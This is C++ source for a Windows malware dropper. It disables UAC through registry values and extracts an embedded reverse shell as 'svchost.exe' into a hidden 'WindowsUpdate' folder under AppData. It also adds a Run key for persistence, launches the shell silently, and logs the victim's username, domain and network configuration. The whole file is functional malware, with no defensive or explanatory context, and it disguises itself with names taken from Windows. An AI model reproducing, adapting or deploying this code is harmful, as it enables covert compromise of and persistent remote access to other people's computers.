#define  _WIN32_WINNT  0x0600 //SDK

#include <iostream>
#include <fstream>
#include <direct.h>
#include <windows.h>
#include <conio.h>
#include "res.h"

const char* bool2str(bool b) {
	return (b ? "SUCCESS" : "FAILED");
}

std::string runCmd(std::string cmd) {
	
	// setup handles
	HANDLE g_hChildStd_OUT_Rd = NULL;
	HANDLE g_hChildStd_OUT_Wr = NULL;
	HANDLE g_hChildStd_ERR_Rd = NULL;
	HANDLE g_hChildStd_ERR_Wr = NULL;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    if (!CreatePipe(&g_hChildStd_ERR_Rd, &g_hChildStd_ERR_Wr, &sa, 0))     { return "failed to pipe ipconfig's output"; }
    if (!SetHandleInformation(g_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT, 0)) { return "failed to pipe ipconfig's output"; }
    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0))     { return "failed to pipe ipconfig's output"; }
    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) { return "failed to pipe ipconfig's output"; }
	
	// create process
	PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdError  = g_hChildStd_ERR_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    CreateProcess(NULL, (char*)"ipconfig.exe /all", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &siStartInfo, &piProcInfo);
	CloseHandle(g_hChildStd_OUT_Wr);
    CloseHandle(g_hChildStd_ERR_Wr);
	
	#define BIGSIZ 4096
	
	std::string output = "";
	while (true) {
		DWORD STDOUT_read;
		CHAR  STDOUT_buf[BIGSIZ];
		bool  STDOUT_success = FALSE;
		STDOUT_success = ReadFile(g_hChildStd_OUT_Rd, STDOUT_buf, BIGSIZ, &STDOUT_read, NULL);
		if(!STDOUT_success || STDOUT_read == 0) { break; }
		std::string s(STDOUT_buf, STDOUT_read);
		output += s.substr(0, s.size() -1);
	}
	
	while (true) {
		DWORD STDERR_read;
		CHAR  STDERR_buf[BIGSIZ];
		bool  STDERR_success = FALSE;
		STDERR_success = ReadFile(g_hChildStd_ERR_Rd, STDERR_buf, BIGSIZ, &STDERR_read, NULL);
		if(!STDERR_success || STDERR_read == 0) { break; }
		std::string s(STDERR_buf, STDERR_read);
		output += s;
	}

	return output;
}

std::string g_tempPath         = getenv("TEMP");
std::string g_appdataPath      = getenv("APPDATA");
std::string g_localAppdataPath = getenv("LOCALAPPDATA");
std::string g_mainDir          = g_appdataPath + "\\WindowsUpdate";
std::string g_revshellPath     = g_mainDir + "\\svchost.exe";

bool removeUAC() {
	
	bool ret = true;
	
	std::cout << "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" << std::endl;
	
	auto setZeroReg = [&ret](const char* key) {
		std::cout << "    RegOpenKeyEx  ... ";
		HKEY hKey;
		LONG openRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
		if (openRes == ERROR_SUCCESS) { std::cout << "SUCCESS" << std::endl; }
		else                          { std::cout << "FAILED"  << std::endl; ret = false; }
		std::cout << "    RegSetValueEx ... ";
		DWORD data = 0;
		LONG setRes = RegSetValueEx(hKey, TEXT(key), 0, REG_DWORD, (const BYTE*)&data, sizeof(data));
		if (setRes == ERROR_SUCCESS) { std::cout << "SUCCESS" << std::endl; }
		else                         { std::cout << "FAILED"  << std::endl; ret = false; }
		std::cout << "    RegCloseKey   ... ";
		LONG closeOut = RegCloseKey(hKey);
		if (closeOut == ERROR_SUCCESS) { std::cout << "SUCCESS" << std::endl; }
		else                           { std::cout << "FAILED"  << std::endl; ret = false; }
	};
	
	std::cout << "  EnableLUA = 0"                  << std::endl; setZeroReg("EnableLUA");
	std::cout << "  ConsentPromptBehaviorAdmin = 0" << std::endl; setZeroReg("ConsentPromptBehaviorAdmin");
	std::cout << "  PromptOnSecureDesktop = 0"      << std::endl; setZeroReg("PromptOnSecureDesktop");
	
	return ret;
}

bool makeMainDir() {
	
	std::cout << "mkdir " << g_mainDir << " ... ";
	int ret = mkdir(g_mainDir.c_str());
	if      (ret ==  0) { std::cout << "SUCCESS" << std::endl; }
	else if (ret == -1) { std::cout << "SUCCESS" << std::endl; }
	else                { std::cout << "FAILED"  << std::endl; return false; }
	
	return true;
}

bool copyShell() {
	
	bool ret = true;
	
	std::string dest = g_mainDir + "\\svchost.exe";
	
	HRSRC myResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	unsigned int myResourceSize = SizeofResource(NULL, myResource);
	HGLOBAL myResourceData = LoadResource(NULL, myResource);
	void* pMyExecutable = LockResource(myResourceData);
	std::ofstream f(dest, std::ios::out | std::ios::binary);
	
	
	std::cout << "extracting shell to: " << dest << " ... ";
	if (f) {
		f.write((char*)pMyExecutable, myResourceSize);
		std::cout << "SUCCESS" << std::endl;
	}
	else {
		std::cout << "FAILED" << std::endl;
		ret = false;
	}
	f.close();
	
	return ret;
}

bool hideMainDir() {
	std::cout << "attrib +s +h " << g_mainDir << " ... ";
	if (SetFileAttributes(g_mainDir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM))
	     { std::cout << "SUCCESS" << std::endl; return true; }
	else { std::cout << "FAILED"  << std::endl; return false; }
}

bool addRegStartupKey() {
	
	bool ret = true;
	
	std::cout << "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" << std::endl;
	std::cout << "  WindowsUpdate = " << g_revshellPath << std::endl;
	std::cout << "    RegOpenKeyEx..: ";
	HKEY hKey;
	LONG openRes = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
	if (openRes == ERROR_SUCCESS) { std::cout << "SUCCESS" << std::endl; }
    else                          { std::cout << "FAILED"  << std::endl; ret = false; }
	
	std::cout << "    RegSetValueEx.: ";
    LPCTSTR data = g_revshellPath.c_str();
    LONG setRes = RegSetValueEx(hKey, TEXT("WindowsUpdate"), 0, REG_SZ, (LPBYTE)data, strlen(data)+1);
	if (setRes == ERROR_SUCCESS) { std::cout << "SUCCESS" << std::endl; }
    else                         { std::cout << "FAILED"  << std::endl; ret = false; }

	std::cout << "    RegCloseKey...: ";
    LONG closeOut = RegCloseKey(hKey);
	if (closeOut == ERROR_SUCCESS) { std::cout << "SUCCESS" << std::endl; }
    else                           { std::cout << "FAILED"  << std::endl; ret = false; }
	
	return ret;
}

bool startShell() {
	
	std::cout << "starting: " << g_revshellPath << " ... ";
	
	// create process
	PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
	if (CreateProcess(NULL, (char*)("cmd /c start \"\" \""+ g_revshellPath + "\\").c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, g_mainDir.c_str(), &siStartInfo, &piProcInfo) != 0) {
		std::cout << "SUCCESS" << std::endl;
		return true;
	}
	else {
		std::cout << "FAILED" << std::endl;
		return false;
	}
}


int main(int argc, char* argv[]) {
	
	std::ofstream f("output.txt", std::ofstream::app);
	f << "==============================="                         << std::endl;
	f << getenv("USERNAME") << " - " << getenv("USERDOMAIN")       << std::endl;
	f << "removeUAC()        ... " << bool2str(removeUAC()       ) << std::endl;
	f << "makeMainDir()      ... " << bool2str(makeMainDir()     ) << std::endl;
	f << "copyShell()        ... " << bool2str(copyShell()       ) << std::endl;
	f << "hideMainDir()      ... " << bool2str(hideMainDir()     ) << std::endl;
	f << "addRegStartupKey() ... " << bool2str(addRegStartupKey()) << std::endl;
	f << "startShell()       ... " << bool2str(startShell()      ) << std::endl;
	f << runCmd("ipconfig.exe");
	f << "==============================="                         << std::endl;
	return 0;
}